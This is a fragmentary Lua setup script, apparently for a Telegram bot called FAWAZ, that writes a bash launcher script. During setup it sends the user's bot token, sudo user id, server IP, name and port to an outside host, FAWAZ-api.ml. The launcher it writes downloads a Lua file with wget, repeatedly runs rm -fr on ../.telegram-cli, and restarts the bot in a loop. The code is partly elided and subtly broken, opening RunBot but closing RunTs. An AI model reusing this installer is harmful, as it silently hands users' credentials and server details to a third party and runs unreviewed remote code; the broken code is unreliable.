...
local token = io.read()
if token ~= '' then
data,res = https.request("https://FAWAZ-api.ml/index.php?p=FAWAZ-DeV")
if res == 200 then
tr = json:decode(data)
...
data,res = https.request("https://FAWAZ-api.ml/index.php?bn=info&id="..Id)
if res == 200 then
...
http.request("https://FAWAZ-api.ml/index.php?n=FAWAZ-DeV&id="..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time)
local RunBot = io.open("FAWAZ", 'w')
RunBot:write([[
#!/usr/bin/env bash
cd $HOME/FAWAZ
token="]]..database:get(Server_Done.."Token_Write")..[["
rm -fr FAWAZ.lua
wget "https://raw.githubusercontent.com/FAWAZ-DeV/FAWAZ/main/FAWAZ.lua"
while(true) do
rm -fr ../.telegram-cli
...
while(true) do
rm -fr ../.telegram-cli
screen -S FAWAZ -X kill
screen -S FAWAZ ./FAWAZ
done
]])
RunTs:close()
end
